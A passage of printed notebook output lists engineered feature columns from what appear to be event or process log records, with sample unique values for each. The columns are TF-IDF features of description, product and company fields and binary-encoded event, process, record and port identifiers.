      "Description_tfidf_191          ['nan', '0.6309428492362296', '0', '0.5355433714440786', '1', '0.0', '0.5097631239512483']\n",
      "Description_tfidf_192          ['0.7543457281173299', 'nan', '0.4159125744121961', '0', '1', '0.0', '0.7181318044779679']\n",
      "Description_tfidf_193          ['0.7952928519566734', 'nan', '0.4527483598977013', '0', '0.6176380518781285', '0.2535795730882987', '0.6328225682497246', '1', '0.0']\n",
      "Description_tfidf_194          ['0.4455693662237305', '0.4691584056086733', '0.3868461377672407', '0.2454925584919829', 'nan', '0.5900070389347402', '0.349638567847385', '0.2433356420585896', '0.4290674144907213', '0.2222557153458709']\n",
      "Description_tfidf_195          ['nan', '0.637284354632601', '0', '0.253301112237522', '0.3878886775347828', '1', '0.2524085372361218', '0.0', '0.6331762045660784', '0.3488674598536331']\n",
      "Description_tfidf_196          ['nan', '0.4808176177221869', '0', '0.4930356278437486', '0.5801166313093453', '0.4298179978393257', '0.4066065263860343', '1', '0.0', '0.5097631239512483']\n",
      "Description_tfidf_197          ['nan', '0.5612100353330018', '0.5515110139471893', '0', '0.5688393702594567', '1', '0.0']\n",
      "Product_tfidf_0                ['0.6696245304085927', 'nan', '0.4472135954999579', '0.676276702661414', '0', '1', '0.0']\n",
      "Product_tfidf_1                ['0.4472135954999579', 'nan', '0.6278080604718204', '0', '0.5625032670004123', '1', '0.0']\n",
      "Product_tfidf_2                ['0.4472135954999579', 'nan', '0', '1', '0.5773502691896257', '0.0', '0.4555894085205829']\n",
      "Product_tfidf_3                ['nan', '0', '1', '0.5773502691896257', '0.0', '0.4555894085205829']\n",
      "Product_tfidf_4                ['0.6808088232789354', 'nan', '0.7071067811865476', '0', '1', '0.0', '0.4555894085205829']\n",
      "Product_tfidf_5                ['nan', '0', '0.4120111204512101', '0.6074670956341428', '1', '0.6895952397489459', '0.5773502691896257', '0.0']\n",
      "Product_tfidf_6                ['nan', '0.4652335315796852', '0.6735742632372417', '0', '0.7275363068857709', '0.4082193878869893', '0.6805160746571647', '1', '0.5428455378645036', '0.0']\n",
      "Product_tfidf_7                ['0.4472135954999579', 'nan', '0.5048591735206234', '0.4596411632288877', '0', '1', '0.0']\n",
      "Product_tfidf_8                ['nan', '0', '0.7241950050335847', '0.6073792273034763', '1', '0.0', '0.62456883780533']\n",
      "Product_tfidf_9                ['nan', '0.5048591735206234', '0.4596411632288877', '0', '1', '0.0', '0.4555894085205829']\n",
      "Product_tfidf_10               ['nan', '0.7255261844908608', '0.5420090005811978', '0.4078632865570642', '0.4596411632288877', '0', '1', '0.4647066221025565', '0.0', '0.5956715067416586']\n",
      "Product_tfidf_11               ['0.625373250653922', 'nan', '0', '0.3935987859005408', '0.6995723921917241', '0.6073792273034763', '1', '0.5388421959277544', '0.0']\n",
      "Product_tfidf_12               ['0.6778613810200079', 'nan', '0', '0.693346394630754', '0.3042949618524994', '1', '0.0', '0.4994729413164604']\n",
      "Product_tfidf_13               ['nan', '0', '1', '0.5773502691896257', '0.7497754024698489', '0.0']\n",
      "Product_tfidf_14               ['0.6616924103019288', 'nan', '0', '1.0', '1', '0.7071067811865475', '0.0']\n",
      "Product_tfidf_15               ['0.4472135954999579', 'nan', '0.6735742632372417', '0', '1', '0.0']\n",
      "Product_tfidf_16               ['nan', '0', '0.2895934475415196', '0.5773502691896257', '1', '0.0', '0.4998551942761082']\n",
      "Product_tfidf_17               ['nan', '0.6278080604718204', '0', '0.767950006435296', '0.5731063630175307', '0.5556896691752831', '1', '0.0', '0.768820749646402']\n",
      "Product_tfidf_18               ['0.4472135954999579', 'nan', '0', '1.0', '0.7145617314712207', '1', '0.0']\n",
      "Product_tfidf_19               ['nan', '0.4649549654262759', '0.4596411632288877', '0', '0.5', '1', '0.0', '0.5956715067416586']\n",
      "Product_tfidf_20               ['0.7475770783716089', 'nan', '0', '0.6572413780113505', '0.5', '1', '0.0', '0.4596579412722459']\n",
      "Product_tfidf_21               ['nan', '0.2716537212452808', '0.6881945623282221', '0.4407953527319232', '0.2004867044982227', '0.6539270199483892', '0.4598260357371421', '0.5141201722370548', '0', '0.6641750611799343']\n",
      "Product_tfidf_22               ['nan', '0.4940264215344373', '0.5119051660525625', '0.3804719505598778', '0.4577035342400719', '0.3024811467208944', '0.5742183632153689', '0.1970446051540914', '0.686069181761587', '0.4462603285931668']\n",
      "Product_tfidf_23               ['0.2333457467517262', 'nan', '0.2846188613625168', '0.498885462967459', '0', '1.0', '0.2895934475415196', '1', '0.0', '0.4998551942761082']\n",
      "Product_tfidf_24               ['0.4472135954999579', 'nan', '0', '0.693346394630754', '0.7435742601194639', '1', '0.0']\n",
      "Product_tfidf_25               ['0.4472135954999579', 'nan', '0.5120360812291107', '0', '1.0', '0.903795891361894', '0.6489326840700566', '1', '0.0', '0.6686533628778006']\n",
      "Product_tfidf_26               ['0.6778613810200079', 'nan', '0', '0.6642134955333121', '0.8171156470916813', '0.4601239815671665', '1', '0.0']\n",
      "Product_tfidf_27               ['0.5120360812291107', 'nan', '0.6425494803045989', '0', '1.0', '1', '0.5773502691896257', '0.0', '0.500815685060953', '0.9047617756714385']\n",
      "Company_tfidf_0                ['0.4472135954999579', 'nan', '0', '0.4508720695764156', '0.5773502691896257', '1', '0.0']\n",
      "Company_tfidf_1                ['nan', '0.4185943948905487', '0', '1', '0.7071067811865475', '0.0']\n",
      "Company_tfidf_2                ['0.4472135954999579', 'nan', '0.9529886113214648', '0', '0.4508720695764156', '1', '0.0']\n",
      "Company_tfidf_3                ['nan', '0', '0.7064405684295858', '0.397357469223178', '1', '0.0', '0.5832519251516252']\n",
      "Company_tfidf_4                ['nan', '0.5773502691896258', '0', '0.5773502691896257', '1', '0.0']\n",
      "Company_tfidf_5                ['nan', '0.7071067811865476', '0', '0.4275793778795598', '1', '0.4082482904638629', '0.0']\n",
      "Company_tfidf_6                ['nan', '0.9517975456635404', '0.9711925250760488', '0', '0.5773502691896257', '1', '0.0']\n",
      "Company_tfidf_7                ['nan', '0.7069159054596434', '0.7071067811865476', '0.7121223109057163', '0', '1', '0.0', '0.3757451082285126']\n",
      "Company_tfidf_8                ['0.7077723668503056', 'nan', '0', '0.3030061165910455', '0.5', '0.5773502691896257', '1', '0.0']\n",
      "Company_tfidf_9                ['nan', '0.5773502691896258', '0', '0.5743767020897188', '0.5348882388663887', '1', '0.0', '0.9176639045165452']\n",
      "Company_tfidf_10               ['nan', '0', '1.0', '0.5743767020897188', '0.5348882388663887', '1', '0.7071067811865475', '0.0', '0.80595127962702']\n",
      "Company_tfidf_11               ['nan', '0.5773502691896258', '0.4185943948905487', '0', '1', '0.5773502691896257', '0.0']\n",
      "EventID_binary_0               ['0', 'nan', '1']\n",
      "EventID_binary_1               ['0', 'nan', '1']\n",
      "EventID_binary_2               ['0', 'nan', '1']\n",
      "EventID_binary_3               ['0', 'nan', '1']\n",
      "EventID_binary_4               ['0', 'nan', '1']\n",
      "EventID_binary_5               ['0', 'nan', '1']\n",
      "EventID_binary_6               ['0', 'nan', '1']\n",
      "EventID_binary_7               ['0', 'nan', '1']\n",
      "EventID_binary_8               ['0', 'nan', '1']\n",
      "EventID_binary_9               ['0', 'nan', '1']\n",
      "EventID_binary_10              ['0', 'nan', '1']\n",
      "EventID_binary_11              ['0', 'nan', '1']\n",
      "EventID_binary_12              ['0', 'nan', '1']\n",
      "EventID_binary_13              ['0', 'nan', '1']\n",
      "EventID_binary_14              ['0', 'nan', '1']\n",
      "EventID_binary_15              ['0', 'nan', '1']\n",
      "ProcessID_binary_0             ['0', 'nan', '1']\n",
      "ProcessID_binary_1             ['0', 'nan', '1']\n",
      "ProcessID_binary_2             ['0', 'nan', '1']\n",
      "ProcessID_binary_3             ['0', 'nan', '1']\n",
      "ProcessID_binary_4             ['0', 'nan', '1']\n",
      "ProcessID_binary_5             ['0', 'nan', '1']\n",
      "ProcessID_binary_6             ['0', 'nan', '1']\n",
      "ProcessID_binary_7             ['0', 'nan', '1']\n",
      "ProcessID_binary_8             ['0', 'nan', '1']\n",
      "ProcessID_binary_9             ['0', 'nan', '1']\n",
      "ProcessID_binary_10            ['0', 'nan', '1']\n",
      "ProcessID_binary_11            ['0', 'nan', '1']\n",
      "ProcessID_binary_12            ['0', 'nan', '1']\n",
      "ProcessID_binary_13            ['0', 'nan', '1']\n",
      "ProcessID_binary_14            ['0', 'nan', '1']\n",
      "ProcessID_binary_15            ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_0   ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_1   ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_2   ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_3   ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_4   ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_5   ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_6   ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_7   ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_8   ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_9   ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_10  ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_11  ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_12  ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_13  ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_14  ['0', 'nan', '1']\n",
      "Execution_ProcessID_binary_15  ['0', 'nan', '1']\n",
      "ParentProcessId_binary_0       ['0', 'nan', '1']\n",
      "ParentProcessId_binary_1       ['0', 'nan', '1']\n",
      "ParentProcessId_binary_2       ['0', 'nan', '1']\n",
      "ParentProcessId_binary_3       ['0', 'nan', '1']\n",
      "ParentProcessId_binary_4       ['0', 'nan', '1']\n",
      "ParentProcessId_binary_5       ['0', 'nan', '1']\n",
      "ParentProcessId_binary_6       ['0', 'nan', '1']\n",
      "ParentProcessId_binary_7       ['0', 'nan', '1']\n",
      "ParentProcessId_binary_8       ['0', 'nan', '1']\n",
      "ParentProcessId_binary_9       ['0', 'nan', '1']\n",
      "ParentProcessId_binary_10      ['0', 'nan', '1']\n",
      "ParentProcessId_binary_11      ['0', 'nan', '1']\n",
      "ParentProcessId_binary_12      ['0', 'nan', '1']\n",
      "ParentProcessId_binary_13      ['0', 'nan', '1']\n",
      "ParentProcessId_binary_14      ['0', 'nan', '1']\n",
      "ParentProcessId_binary_15      ['0', 'nan', '1']\n",
      "TargetProcessId_binary_0       ['nan', '0', '1']\n",
      "TargetProcessId_binary_1       ['nan', '0', '1']\n",
      "TargetProcessId_binary_2       ['0', 'nan', '1']\n",
      "TargetProcessId_binary_3       ['0', 'nan', '1']\n",
      "TargetProcessId_binary_4       ['0', 'nan', '1']\n",
      "TargetProcessId_binary_5       ['0', 'nan', '1']\n",
      "TargetProcessId_binary_6       ['0', 'nan', '1']\n",
      "TargetProcessId_binary_7       ['0', 'nan', '1']\n",
      "TargetProcessId_binary_8       ['0', 'nan', '1']\n",
      "TargetProcessId_binary_9       ['nan', '0', '1']\n",
      "TargetProcessId_binary_10      ['nan', '0', '1']\n",
      "TargetProcessId_binary_11      ['nan', '0', '1']\n",
      "TargetProcessId_binary_12      ['nan', '0', '1']\n",
      "TargetProcessId_binary_13      ['nan', '0', '1']\n",
      "TargetProcessId_binary_14      ['nan', '0', '1']\n",
      "TargetProcessId_binary_15      ['nan', '0', '1']\n",
      "EventRecordID_binary_0         ['0', 'nan', '1']\n",
      "EventRecordID_binary_1         ['0', 'nan', '1']\n",
      "EventRecordID_binary_2         ['0', 'nan', '1']\n",
      "EventRecordID_binary_3         ['0', 'nan', '1']\n",
      "EventRecordID_binary_4         ['0', 'nan', '1']\n",
      "EventRecordID_binary_5         ['0', 'nan', '1']\n",
      "EventRecordID_binary_6         ['0', 'nan', '1']\n",
      "EventRecordID_binary_7         ['0', 'nan', '1']\n",
      "EventRecordID_binary_8         ['0', 'nan', '1']\n",
      "EventRecordID_binary_9         ['0', 'nan', '1']\n",
      "EventRecordID_binary_10        ['0', 'nan', '1']\n",
      "EventRecordID_binary_11        ['0', 'nan', '1']\n",
      "EventRecordID_binary_12        ['0', 'nan', '1']\n",
      "EventRecordID_binary_13        ['0', 'nan', '1']\n",
      "EventRecordID_binary_14        ['0', 'nan', '1']\n",
      "EventRecordID_binary_15        ['0', 'nan', '1']\n",
      "SourcePort_binary_0            ['0', 'nan', '1']\n",
      "SourcePort_binary_1            ['0', 'nan', '1']\n",
      "SourcePort_binary_2            ['0', 'nan', '1']\n",
      "SourcePort_binary_3            ['0', 'nan', '1']\n",
      "SourcePort_binary_4            ['0', 'nan', '1']\n",
      "SourcePort_binary_5            ['0', 'nan', '1']\n",
      "SourcePort_binary_6            ['0', 'nan', '1']\n",
      "SourcePort_binary_7            ['0', 'nan', '1']\n",
      "SourcePort_binary_8            ['0', 'nan', '1']\n",
      "SourcePort_binary_9            ['0', 'nan', '1']\n",
      "SourcePort_binary_10           ['0', 'nan', '1']\n",
      "SourcePort_binary_11           ['0', 'nan', '1']\n",
      "SourcePort_binary_12           ['0', 'nan', '1']\n",
      "SourcePort_binary_13           ['0', 'nan', '1']\n",
      "SourcePort_binary_14           ['0', 'nan', '1']\n",
      "SourcePort_binary_15           ['0', 'nan', '1']\n",
      "DestinationPort_binary_0       ['0', 'nan', '1']\n",
      "DestinationPort_binary_1       ['0', 'nan', '1']\n",
      "DestinationPort_binary_2       ['0', 'nan', '1']\n",
      "DestinationPort_binary_3       ['0', 'nan', '1']\n",
      "DestinationPort_binary_4       ['0', 'nan', '1']\n",
      "DestinationPort_binary_5       ['0', 'nan', '1']\n",
      "DestinationPort_binary_6       ['0', 'nan', '1']\n",
      "DestinationPort_binary_7       ['0', 'nan', '1']\n",
      "DestinationPort_binary_8       ['0', 'nan', '1']\n",
      "DestinationPort_binary_9       ['0', 'nan', '1']\n",
      "DestinationPort_binary_10      ['0', 'nan', '1']\n",
      "DestinationPort_binary_11      ['0', 'nan', '1']\n",
      "DestinationPort_binary_12      ['0', 'nan', '1']\n",
      "DestinationPort_binary_13      ['0', 'nan', '1']\n",
      "DestinationPort_binary_14      ['0', 'nan', '1']\n",
      "DestinationPort_binary_15      ['0', 'nan', '1']\n",
      "ProcessId_binary_0             ['0', 'nan', '1']\n",
      "ProcessId_binary_1             ['0', 'nan', '1']\n",
      "ProcessId_binary_2             ['0', 'nan', '1']\n",
      "ProcessId_binary_3             ['0', 'nan', '1']\n",
      "ProcessId_binary_4             ['0', 'nan', '1']\n",
      "ProcessId_binary_5             ['0', 'nan', '1']\n",
      "ProcessId_binary_6             ['0', 'nan', '1']\n",
      "ProcessId_binary_7             ['0', 'nan', '1']\n",
      "ProcessId_binary_8             ['0', 'nan', '1']\n",
      "ProcessId_binary_9             ['0', 'nan', '1']\n",
      "ProcessId_binary_10            ['0', 'nan', '1']\n",
      "ProcessId_binary_11            ['0', 'nan', '1']\n",
      "ProcessId_binary_12            ['0', 'nan', '1']\n",
      "ProcessId_binary_13            ['0', 'nan', '1']\n",
      "ProcessId_binary_14            ['0', 'nan', '1']\n",
      "ProcessId_binary_15            ['0', 'nan', '1']\n",
      "Description_tfidf_198          ['nan', '0.4995930755604419', '0.5515110139471893', '0.4056689306164255', '0.5022586117445703', '0', '0.3910475101895148', '0.5400230016558445', '1', '0.328765661617324']\n",
      "Description_tfidf_199          ['nan', '0', '1.0', '0.5355433714440786', '1', '0.0']\n",
      "Description_tfidf_200          ['nan', '0.5514350193755396', '0.5292995982402695', '0', '0.5529286939288685', '1', '0.0']\n",
      "Description_tfidf_201          ['nan', '0.7499457624904682', '0', '1', '0.5557148073311955', '0.0']\n",
      "Description_tfidf_202          ['nan', '0', '0.5495734347865395', '0.5', '1', '0.0']\n",
      "Description_tfidf_203          ['nan', '0.5197646144677307', '0', '0.725691924165561', '1', '0.0']\n",
      "Description_tfidf_204          ['0.3748980118006671', 'nan', '0.5571376833421978', '0', '1', '0.0']\n",
      "Description_tfidf_205          ['nan', '0', '0.3798328870434758', '0.7488789161432898', '1', '0.0']\n",
      "Description_tfidf_206          ['nan', '0.784456205613417', '0', '0.5107603241600465', '0.4471405084691947', '1', '0.0']\n",
      "Description_tfidf_207          ['nan', '0.7369014737565478', '0', '0.5959252232831991', '0.6800549286590192', '1', '0.0', '0.4404337013081736']\n",
      "Description_tfidf_208          ['nan', '0.781925531350407', '0', '0.7492007160684404', '1', '0.5641134351991994', '0.0']\n",
      "Description_tfidf_209          ['nan', '0.7551288508360893', '0', '0.5796773541097503', '1', '0.0']\n",
      "Description_tfidf_210          ['nan', '0', '0.4506456357694011', '1', '0.3334869679659735', '0.5608187951228312', '0.3845473955871179', '0.0', '0.4829062585875363', '0.5240389059399814']\n",
      "Description_tfidf_211          ['nan', '0.5790004211609039', '0', '1', '0.0', '0.5568715639441717']\n",
      "Description_tfidf_212          ['nan', '0', '0.682383941696141', '0.6611497477766993', '1', '0.0']\n",
      "Description_tfidf_213          ['nan', '0', '0.464971926014355', '1', '0.0', '0.4525558115415694']\n",
      "Description_tfidf_214          ['nan', '0.5773502691896258', '0', '1', '0.4911251068634023', '0.0']\n",
      "Description_tfidf_215          ['nan', '0.6624563995780818', '0', '1', '0.5888761581433657', '0.0']\n",
      "Description_tfidf_216          ['nan', '0.3579617015775619', '0.5405718947867423', '0', '0.5355787896792545', '0.663411490521429', '0.3765949831012435', '1', '0.0', '0.5219332979149681']\n",
      "Description_tfidf_217          ['nan', '0.5883825740909882', '0', '0.721475010776613', '1', '0.0']\n",
      "Description_tfidf_218          ['0.261547778260854', 'nan', '0.592057347778808', '0', '0.5912853720166983', '0.4652439043657539', '0.3955046315742778', '0.4972946650719546', '1', '0.0']\n",
      "Description_tfidf_219          ['nan', '0.4713580205901866', '0.4087863014769101', '0.7795943167026224', '0', '1', '0.0', '0.5581718845451762']\n",
      "Description_tfidf_220          ['nan', '0.5776011909821258', '0.6052498079787018', '0', '0.4152948052745288', '0.5063423191457963', '1', '0.0']\n",
      "Description_tfidf_221          ['0.3728604498247964', 'nan', '0.5671062902631613', '0.5408527127438348', '0.4395143565012551', '0', '0.5593744119021609', '0.4496117430173721', '0.7537988857710356', '1']\n",
      "Description_tfidf_222          ['nan', '0.4695775051817161', '0.3685545712256436', '0.3360354042190731', '0.7076196717712547', '0.3145211158643408', '0.6377747671714251', '0.3397247179437631', '0.0', '0.3491406976525959']\n",
      "Description_tfidf_223          ['nan', '0.4341384740185948', '0.3437732965593136', '0.5070566358298514', '0.1321975114006113', '0.3421539166885747', '0.2689869593026306', '0.4584834090846683', '0.2845843805378628', '0.5140458714855579']\n",
      "Description_tfidf_224          ['nan', '0', '0.3270943639043522', '0.6306341780022575', '1', '0.4422467479653296', '0.0', '0.5331516287990304']\n",
      "Description_tfidf_225          ['0.5467608356181485', 'nan', '0', '0.705359720955414', '1', '0.646772214840922', '0.0']\n",
      "Description_tfidf_226          ['nan', '0', '1.0', '0.6443253343381513', '0.7393751830092592', '0.5695260656720902', '1', '0.0']\n",
      "Description_tfidf_227          ['nan', '0.7174476553721777', '0.4661988559399402', '0.6277120533416138', '0.8973180647242817', '0', '1.0', '1', '0.0', '0.6796079963893225']\n",
      "Description_tfidf_228          ['nan', '0', '1.0', '0.7211998708471626', '1', '0.5038354164946025', '0.0', '0.5076752892054487', '0.6157742348441944', '0.9062661368226644']\n",
      "Description_tfidf_229          ['nan', '0', '0.8987186572549507', '1', '0.5296471387299279', '0.0']\n",
      "Description_tfidf_230          ['nan', '0.5093559652282438', '0', '1', '0.0', '0.6283168985169216']\n",
      "Description_tfidf_231          ['nan', '0', '0.907563264556629', '1', '0.6489071683391648', '0.587987312617624', '0.0']\n",
      "Description_tfidf_232          ['nan', '0.5213918412004918', '0', '0.5456590366026652', '1', '0.0']\n",
      "Description_tfidf_233          ['nan', '0', '1.0', '0.5237869941091697', '1', '0.0']\n",
      "Description_tfidf_234          ['0.4488201640400915', 'nan', '0.7750308773667669', '0.6008295103328122', '0', '0.673319139356002', '1', '0.0', '0.8123962909165593']\n",
      "Description_tfidf_235          ['0.3748980118006671', 'nan', '0', '0.5220449890184059', '1', '0.0']\n",
      "Description_tfidf_236          ['0.470547661697783', 'nan', '0.9049403525258486', '0', '1', '0.0']\n",
      "Description_tfidf_237          ['nan', '0', '0.6573693506857228', '0.3798328870434758', '1', '0.0']\n",
      "Description_tfidf_238          ['0.4871427449726066', 'nan', '0', '0.5215968087281899', '1', '0.0']\n",
      "Description_tfidf_239          ['nan', '0.6769735562743675', '0.3387724857610171', '0', '0.3934303478297551', '0.5239357617004079', '1', '0.0']\n",
      "Description_tfidf_240          ['nan', '0.5221070082738278', '0', '1', '0.5466042146006942', '0.0']\n",
      "Description_tfidf_241          ['nan', '0.739466873610651', '0', '0.6921361498981885', '0.5225246920436047', '1', '0.0']\n",
      "Description_tfidf_242          ['nan', '0.7764690473795691', '0', '1', '0.0', '0.7379016994274683', '0.5981162597744202']\n",
      "Description_tfidf_243          ['nan', '0', '0.5395740872736965', '0.662376112091109', '1', '0.0']\n",
      "Description_tfidf_244          ['0.5377059719641689', 'nan', '0', '0.6803492410891239', '1', '0.7047791598163613', '0.0']\n",
      "Description_tfidf_245          ['nan', '0.5900070389347402', '0.5917961549719091', '0', '1', '0.0']\n",
      "Description_tfidf_246          ['nan', '0', '0.5561282588977239', '0.5198783713387514', '1', '0.0', '0.6779447367447474']\n",
      "Description_tfidf_247          ['nan', '0', '0.5529286939288685', '0.6810392786608965', '1', '0.0']\n",
      "Description_tfidf_248          ['nan', '0.6908467313982579', '0.5544756492019965', '0.5352467613015638', '0', '0.4845560808745748', '1', '0.7047791598163613', '0.0']\n",
      "Description_tfidf_249          ['nan', '0', '1', '0.600420403486988', '0.0', '0.5981162597744202']\n",
      "Description_tfidf_250          ['0.6540163429038666', 'nan', '0.4970779703425078', '0', '0.4692199117824757', '0.6049520475860353', '1', '0.0']\n",
      "Description_tfidf_251          ['nan', '0', '0.5495734347865395', '1', '0.0', '0.710613933813291']\n",
      "Description_tfidf_252          ['nan', '0', '0.534779671408609', '1', '0.4811546368112021', '0.0', '0.6458488093493621', '0.5325650546267325', '0.6047069201860436']\n",
      "Description_tfidf_253          ['0.5654238570462728', 'nan', '0.6583374833986989', '0', '0.6181899644545304', '1', '0.0']\n",
      "Description_tfidf_254          ['nan', '0.6763114612141804', '0.5647316112533409', '0', '0.5434599097976189', '1', '0.0', '0.6032411263567865']\n",
      "Description_tfidf_255          ['nan', '0.6411119951123931', '0.5208485939269996', '0', '0.5012852985831331', '0.8099090733983789', '0.4031637832208513', '1', '0.4255207772583004', '0.0']\n",
      "Description_tfidf_256          ['0.5246508390478645', 'nan', '0.5986135359348032', '0', '0.6025761767460474', '1', '0.6594538292559976', '0.0', '0.8029272580317245']\n",
      "Description_tfidf_257          ['nan', '0.4931870418357522', '0.6430594388910653', '0', '0.4787156038032458', '0.5214920303568793', '0.5307583906678026', '1', '0.8834442097358305', '0.4552371623459894']\n",
      "Description_tfidf_258          ['nan', '0.6675052969120417', '0.5645166331436621', '0', '1', '0.8117598980038714', '0.0', '0.5322815694641929']\n",
      "Description_tfidf_259          ['nan', '0.6688391170024061', '0.5694216033794156', '0', '0.345144877407995', '1', '0.0']\n",
      "Description_tfidf_260          ['nan', '0', '1.0', '0.2509272106474632', '0.736963538027075', '0.2506516624094527', '1', '0.0']\n",
      "Description_tfidf_261          ['nan', '0.6364254543693927', '0.5986135359348032', '0', '1', '0.0']\n",
      "Description_tfidf_262          ['nan', '0.2184041055734295', '0', '0.3639724239020578', '0.3651880071541631', '0.397720937785863', '0.2112074854165948', '1', '0.0', '0.4831836040651258']\n",
      "Description_tfidf_263          ['0.3384632074177214', 'nan', '0.3727813613073564', '0.4365145450929173', '0.383719653022017', '0.0', '0.4339086901288891', '0.4911423421171906', '0.549919368126343', '0.5101438748180815']\n",
      "Description_tfidf_264          ['nan', '0.5441976040193577', '0.5612100353330018', '0', '1', '0.0']\n",
      "Description_tfidf_265          ['nan', '0', '0.500269193247003', '0.5002532697632396', '1', '0.0']\n",
      "Description_tfidf_266          ['nan', '0.4145398777332585', '0', '0.7475519119470408', '1', '0.8790958412287134', '0.0', '0.5399669436908149', '0.4680074109412441']\n",
      "Description_tfidf_267          ['nan', '0', '0.5446620024460633', '0.4614161867054864', '1', '0.600420403486988', '0.0', '0.6183086179281089']\n",
      "Description_tfidf_268          ['nan', '0.8609079232781496', '0.6702115118365494', '0.4901470521818354', '0', '0.405572673489484', '0.3247724110957738', '0.4004102326563151', '0.5673277775572612', '0.3650743383442034']\n",
      "Description_tfidf_269          ['nan', '0.5917961549719091', '0', '1', '0.0', '0.6469155719126002']\n",
      "Description_tfidf_270          ['0.3372141347053604', 'nan', '0.4568956872106059', '0.3808711157182962', '0.4500849634355181', '0', '0.4058816360238307', '1', '0.7094267656978724', '0.47046451971509']\n",
      "Description_tfidf_271          ['0.4689537839688009', 'nan', '0.5883825740909882', '0', '1', '0.0']\n",
      "Description_tfidf_272          ['nan', '0', '0.3375529103505252', '0.3869227260837289', '0.8128501444048684', '0.4077177089704437', '0.3018773685100746', '1', '0.7094267656978724', '0.7626224774789353']\n",
      "Description_tfidf_273          ['nan', '0', '1.0', '0.4674606259930389', '1', '0.0']\n",
      "Description_tfidf_274          ['nan', '0.6670575701827204', '0.3397582072896728', '0.4841768809120259', '0', '0.5198135487537483', '1', '0.0']\n",
      "Description_tfidf_275          ['nan', '0', '1.0', '1', '0.0']\n",
      "Description_tfidf_276          ['nan', '0.2800978717642337', '0.4001132111303539', '0.3180846641474453', '0.3064426852296782', '0', '1.0', '0.3788779775559351', '0.4490771246899568', '0.500008680991566']\n",
      "Description_tfidf_277          ['nan', '0', '1', '0.0', '0.5685686690457904', '0.8588579221959227']\n",
      "Description_tfidf_278          ['0.4689537839688009', 'nan', '0', '1.0', '1', '0.0']\n",
      "Description_tfidf_279          ['0.2794259450477528', 'nan', '0.5615150618079908', '0.2877665343474582', '0.5276242140857235', '0.3844068158205014', '0.570040148185713', '0.3525879638994872', '0.3584717680445108', '0.3775293159916504']\n",
      "Description_tfidf_280          ['nan', '0', '0.4674606259930389', '1', '0.5296471387299279', '0.0']\n",
      "Description_tfidf_281          ['nan', '0.5892191473768976', '0', '0.5215968087281899', '1', '0.0']\n",
      "Description_tfidf_282          ['nan', '0.5612100353330018', '0.4387320730183357', '0', '0.475994303763979', '0.5955535448151956', '0.5598614101415968', '0.5658168369901935', '1', '0.5175659220346076']\n",
      "Description_tfidf_283          ['nan', '0', '0.8387524914293145', '1', '0.5038354164946025', '0.0']\n",
      "Description_tfidf_284          ['nan', '0', '0.4313539102445701', '1', '0.6120624957514432', '0.0']\n",
      "Description_tfidf_285          ['nan', '0.563552651107355', '0.5604047278153595', '0', '0.6366871360795814', '0.6674915868542988', '0.481944200942616', '1', '0.0']\n",
      "Description_tfidf_286          ['0.8330294725942635', 'nan', '0', '1.0', '1', '0.0']\n",
      "Description_tfidf_287          ['nan', '0.5708421542242875', '0.6212423239448945', '0', '1', '0.6663146972404789', '0.0', '0.4219339103145202']\n",
      "Description_tfidf_288          ['nan', '0.2219958526287754', '0.2857441034241663', '0.3001950878162959', '0.2927348093964736', '0.3318763890773119', '0.3133673760430532', '0.2843061664391744', '0.3515042487739295', '0.3581182293478616']\n",
      "Description_tfidf_289          ['nan', '0.3511407441221', '0.3089890386122084', '0.3543475091831957', '0.2229210594701576', '0.4111452969199325', '0.1919514390838593', '0.3654677138484974', '0.2920903930397847', '0.3933449524936371']\n",
      "Description_tfidf_290          ['nan', '0', '1', '0.8288737028439592', '0.5160548267948627', '0.0', '0.7984906574996301']\n",
      "Description_tfidf_291          ['nan', '0', '1.0', '1', '0.7025964535481214', '0.0', '0.7421701485520465']\n",
      "Description_tfidf_292          ['nan', '0', '0.253301112237522', '0.2535795730882987', '1', '0.0']\n",
      "Description_tfidf_293          ['0.3509223197805017', 'nan', '0.3364841494436725', '0', '0.278787436227318', '0.7689411077787356', '1', '0.4088591785817915', '0.0', '0.6260462658023283']\n",
      "Description_tfidf_294          ['nan', '0.6868358571165656', '0', '0.6897990667813707', '1', '0.0']\n",
      "Description_tfidf_295          ['nan', '0', '0.5461221879558283', '0.4918927581259744', '0.5286218045965957', '1', '0.5574870661802058', '0.0']\n",
      "Description_tfidf_296          ['nan', '0.5773502691896258', '0.6502146377164213', '0', '1', '0.0']\n",
      "Description_tfidf_297          ['nan', '0', '0.253301112237522', '0.2535795730882987', '1', '0.0']\n",
      "Description_tfidf_298          ['nan', '0', '0.8887029670222222', '0.5985644131564245', '1', '0.0']\n",
      "Description_tfidf_299          ['nan', '0.4145398777332585', '0', '1', '0.6068124317521646', '0.0']\n",
      "Product_tfidf_28               ['nan', '0', '1', '0.5020246563771575', '0.0', '0.8187021872123358']\n",
      "Product_tfidf_29               ['nan', '0.62456883780533', '0', '1', '0.0', '0.3207577252480183', '0.5002139837373293']\n",
      "Product_tfidf_30               ['0.4472135954999579', 'nan', '0', '1', '0.6074670956341428', '0.0']\n",
      "Product_tfidf_31               ['0.4472135954999579', 'nan', '0', '1', '0.6600647724199762', '0.0']\n",
      "Product_tfidf_32               ['nan', '0', '0.6572413780113505', '1', '0.0', '0.6605599476342134']\n",
      "Product_tfidf_33               ['nan', '0', '0.7521279312814027', '1', '0.0', '0.6539270199483892']\n",
      "Product_tfidf_34               ['nan', '0', '1.0', '0.7735304934911523', '1', '0.0']\n",
      "Product_tfidf_35               ['nan', '0.4649549654262759', '0', '1.0', '0.5', '1', '0.0']\n",
      "Product_tfidf_36               ['nan', '0', '0.5', '1', '0.9743233263438158', '0.0', '0.4596579412722459']\n",
      "Product_tfidf_37               ['nan', '0.9615511029043452', '0', '1', '0.5773502691896257', '0.0']\n",
